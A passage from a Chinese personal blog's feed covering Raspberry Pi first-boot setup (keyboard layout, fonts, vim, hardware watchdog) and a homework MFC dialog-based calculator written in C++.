<h2 id="Pi的开机配置"><a href="#Pi的开机配置" class="headerlink" title="Pi的开机配置"></a>Pi的开机配置</h2><h3 id="语言和键盘"><a href="#语言和键盘" class="headerlink" title="语言和键盘"></a>语言和键盘</h3><p>把HDMI，鼠标键盘电源线接好，然后它居然直接出现了桌面，难道是我的人品太好（ ｉ <em> ｉ ）。<br>激动的点开终端，咦，怎么有些键不能用=</em>=<br>别慌，Pi是腐国的产品，默认的是英式键盘的键位，我们使用的大部分都是美式键盘。所以我们简单的配置下:<br>终端输入<br><code>raspi-config</code><br>选<code>Internationalisation opntions</code><br>选<code>I3 Change Keyboard Layout</code><br>选<code>Generic 101-key  PC</code><br>选<code>Other</code><br>选<code>English(US)</code><br>选<code>English(US) - English(US,alternative international)</code><br>后面都选择确定，键盘上下键选择，tab切换选项，enter确定。<br>注意！！！我不建议大家把Pi的系统语言改成中文的，至于为什么大家试一试就知道了，字体炸裂……<br>注:编码需要选择下，UTF-8，原因大家都懂。给个<a href="http://www.guokr.com/post/520901/" target="_blank" rel="external">果壳</a>的参考，我就不多写了。  </p>
<h3 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h3><p><code>sudo apt-get -y install ttf-wqy-zenhei</code></p>
<h3 id="安装VIM"><a href="#安装VIM" class="headerlink" title="安装VIM"></a>安装VIM</h3><p>好吧，这步大家可以跳过，我有强迫症:-)<br><code>sudo apt-get install -y vim</code><br>简单配置下代码高亮<br>在～目录下新建.vimrc文件，写入下面的内容:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">set nu</div><div class="line">syntax on</div><div class="line">set tabstop=4</div></pre></td></tr></table></figure>
<h2 id="配置watchdog"><a href="#配置watchdog" class="headerlink" title="配置watchdog"></a>配置watchdog</h2><p>Pi的看门狗防止程序死循环，设置好就能让Pi在当机的时候自动重启。 </p>
<ol>
<li>启动硬件看门狗模块<br><code>sudo modprobe bcm2708_wdog</code></li>
<li>编辑/etc/modules,启动时自加载模块<br><code>sudo vim /etc/modules</code><br>在文件的最后加上<br><code>bcm2708_wdog</code></li>
<li>启动与配置watchdog<br>启动watchdog<br><code>sudo /etc/init.d/watchdog start</code><br>编辑配置文件<br><code>sudo vim /etc/watchdog.conf</code><br>把<code>#watchdog-device =/dev/watchdog</code>前面的<code>#</code>删去<br>重新启动watchdog<br><code>sudo /etc/init.d/watchdog restart</code><br>还可以监控芯片温度什么，过热自动重启之类。<h2 id="一些小插曲和随手拍的图"><a href="#一些小插曲和随手拍的图" class="headerlink" title="一些小插曲和随手拍的图"></a>一些小插曲和随手拍的图</h2></li>
</ol>
<ul>
<li>中间有个小小的意外，我随手装了个多媒体系统试试效果，XBMC，就是这货，装完重启直接进不了系统了233。简单分析了下原因，貌似是显存分配不足，应该要在安装前配置下内存的分配。这个小插曲直接导致了我决定今晚赶紧把今天做的配置记录下来。这样一块用来折腾的Pi估计以后要经常重刷系统了=_=  </li>
<li>桌面上的显示器是一块笔记本的屏，我又在万能的某宝上买了块驱动版，我现在打算买个相框把屏幕裱起来。话说不加壳的屏真的是好薄啊，看起来很有逼格。<br><img src="http://ww2.sinaimg.cn/mw690/005WMcFzjw1eyx9x5jdvej32io1w0e81.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/mw690/005WMcFzjw1eyx9wypk1rj32io1w0npd.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/mw690/005WMcFzjw1eyx9whbb85j32io1w01kx.jpg" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;生日快到了，女票送了一个树莓ψ(｀∇´)ψ,好开心，简单写下使用体验吧。
    
    </summary>
    
      <category term="嵌入式开发" scheme="https://hsmouc.com/categories/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Pi" scheme="https://hsmouc.com/tags/Pi/"/>
    
  </entry>
  
  <entry>
    <title>MFC代码--基于对话框的计算器设计</title>
    <link href="https://hsmouc.com/2015/12/09/2015-12-08-mfc/"/>
    <id>https://hsmouc.com/2015/12/09/2015-12-08-mfc/</id>
    <published>2015-12-09T08:34:43.000Z</published>
    <updated>2017-01-03T15:16:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MFC的作业"><a href="#MFC的作业" class="headerlink" title="MFC的作业"></a>MFC的作业</h2><ul>
<li>编写一个计算器程序。使用该计算机使用编辑控件直接输入数据，并有加减乘除、平方根和倒数运算功能。</li>
<li>简要分析:用AppWizard生成一个基于对话框的应用程序框架，编辑对话框模版资源，添加一个编辑控件，添加8个按钮，设置下ID和Caption。<a id="more"></a> 
<h3 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnSetfocusInput() </div><div class="line">&#123;</div><div class="line">	m_fInput=<span class="number">0.0</span>;</div><div class="line">	UpdateData(FALSE);</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnAdd() </div><div class="line">&#123;</div><div class="line">	OnCalc();</div><div class="line">	m_nOP=<span class="number">1</span>;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnCalc() </div><div class="line">&#123;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	UpdateData(TRUE);</div><div class="line">	<span class="keyword">switch</span>(m_nOP)</div><div class="line">	&#123;</div><div class="line">	    <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">		    m_fResult=m_fInput;</div><div class="line">		    <span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">			m_fResult+=m_fInput;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">			m_fResult-=m_fInput;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">3</span>:</div><div class="line">			m_fResult*=m_fInput;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">4</span>:</div><div class="line">			m_fResult/=m_fInput;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">5</span>:</div><div class="line">			m_fResult=<span class="number">1</span>/m_fInput;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">			m_fResult=<span class="built_in">sqrt</span>(m_fInput);</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line">	m_fInput=m_fResult;</div><div class="line">	UpdateData(FALSE);</div><div class="line">	</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnClear() </div><div class="line">&#123;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	m_fResult=<span class="number">0.0</span>;</div><div class="line">	m_fInput=<span class="number">0.0</span>;</div><div class="line">	m_nOP=<span class="number">0</span>;</div><div class="line">	UpdateData(FALSE);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnDiv() </div><div class="line">&#123;</div><div class="line">	OnCalc();</div><div class="line">	m_nOP=<span class="number">4</span>;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnMul() </div><div class="line">&#123;</div><div class="line">	OnCalc();</div><div class="line">	m_nOP=<span class="number">3</span>;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnReciprocal() </div><div class="line">&#123;</div><div class="line">	m_nOP=<span class="number">5</span>;</div><div class="line">	OnCalc();</div><div class="line">	m_nOP=<span class="number">0</span>;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnSqrt() </div><div class="line">&#123;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	m_nOP=<span class="number">6</span>;</div><div class="line">	OnCalc();</div><div class="line">	m_nOP=<span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnSub() </div><div class="line">&#123;</div><div class="line">	OnCalc();</div><div class="line">	m_nOP=<span class="number">2</span>;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>省略了一些声明和初始化代码。</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>新知识主要有:<br>为编辑控件的消息EN_SETFOCUS添加一个映射函数OnSetfocusInput()。<br>对话框类的成员函数UpdateData()用于更新数据。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;MFC的作业&quot;&gt;&lt;a href=&quot;#MFC的作业&quot; class=&quot;headerlink&quot; title=&quot;MFC的作业&quot;&gt;&lt;/a&gt;MFC的作业&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;编写一个计算器程序。使用该计算机使用编辑控件直接输入数据，并有加减乘除、平方根和倒数运算功能。&lt;/li&gt;
&lt;li&gt;简要分析:用AppWizard生成一个基于对话框的应用程序框架，编辑对话框模版资源，添加一个编辑控件，添加8个按钮，设置下ID和Caption。
    
    </summary>
    
      <category term="编程学习" scheme="https://hsmouc.com/categories/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="C++" scheme="https://hsmouc.com/tags/C/"/>
    
      <category term="MFC" scheme="https://hsmouc.com/tags/MFC/"/>
    
  </entry>
  
</feed>
